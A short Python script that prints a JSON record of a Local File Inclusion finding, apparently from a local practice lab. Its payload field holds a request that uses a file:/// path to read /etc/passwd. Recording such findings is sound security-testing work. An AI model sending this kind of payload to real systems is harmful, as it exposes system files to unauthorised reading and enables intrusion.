import json

data = {
    "Vulnerability": "Local File Inclusion",
    "URL": "http://localhost/vulnerabilities/fi/?page=",
    "Method": "get",
    "Payload": "http://localhost/vulnerabilities/fi/?page=file:///etc/passwd"
}

print(json.dumps(data, indent=4))



